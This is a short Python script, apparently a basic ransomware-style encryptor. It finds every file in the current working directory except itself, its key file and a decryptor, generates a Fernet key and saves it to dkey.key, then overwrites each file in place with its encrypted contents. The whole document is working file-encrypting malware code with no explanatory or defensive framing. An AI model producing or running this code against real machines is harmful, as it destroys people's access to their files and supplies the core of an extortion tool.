#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "encryptor.py" or file == "dkey.key" or file == "decryptor.py":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)

key = Fernet.generate_key()

with open("dkey.key", "wb") as dkey:
        dkey.write(key)

for file in files:
        with open(file, "rb") as dfile:
                contents = dfile.read()
        contents_encrypted = Fernet(key).encrypt(contents)

        with open(file, "wb") as dfile:
                dfile.write(contents_encrypted)